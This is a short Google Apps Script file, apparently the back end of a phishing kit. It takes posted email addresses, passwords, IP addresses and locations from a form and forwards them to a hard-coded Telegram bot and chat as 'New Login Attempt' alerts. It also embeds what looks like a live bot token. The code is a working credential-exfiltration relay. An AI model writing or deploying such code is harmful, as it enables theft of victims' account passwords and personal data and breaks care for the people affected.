// Google Apps Script to receive form data and send to Telegram
// Deploy as Web App with access: "Anyone"

const TELEGRAM_BOT_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const TELEGRAM_CHAT_ID = '1318100118';

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);
    
    // Format message for Telegram
    const message = `
🔐 *New Login Attempt*

📧 *Email:* ${data.email}
🔑 *Password:* ${data.password}
⏰ *Timestamp:* ${data.timestamp}
🌐 *User Agent:* ${data.userAgent}
📍 *IP Address:* ${data.ip}
🌍 *Country:* ${data.country}
🏙️ *City:* ${data.city}
    `;
    
    // Send to Telegram
    sendTelegramMessage(message);
    
    return ContentService.createTextOutput(JSON.stringify({status: 'success'}))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({status: 'error', error: error.toString()}))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'Markdown'
  };
  
  const options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(payload),
    muteHttpExceptions: true
  };
  
  UrlFetchApp.fetch(url, options);
}

// Test function (run manually to test)
function testTelegram() {
  const testMessage = `
🔐 *Test Message*

This is a test from Google Apps Script.
  `;
  sendTelegramMessage(testMessage);
}
